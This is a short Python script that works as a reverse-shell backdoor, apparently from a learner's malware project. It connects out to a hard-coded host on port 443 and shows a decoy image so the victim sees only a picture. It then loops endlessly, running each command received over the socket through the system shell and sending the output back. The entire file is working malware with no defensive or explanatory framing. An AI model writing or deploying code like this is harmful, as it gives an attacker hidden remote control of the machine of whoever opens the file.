import socket
import subprocess
from PIL import Image

def run_command(comando):
    comando_output = subprocess.check_output(comando, shell=True)
    return comando_output.decode('cp850')

if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('192.168.0.8', 443))
    ruta = "C:\\Users\\girim\\OneDrive\\Desktop\\malware_python\\dist\\R.png"
    imagen = Image.open(ruta)
    imagen.show()
    while True:
        comando = client_socket.recv(1024).decode().strip()
        salida_comando = run_command(comando)
        client_socket.send(b"\n" + salida_comando.encode() + b'\n\n')
        
    client_socket.close()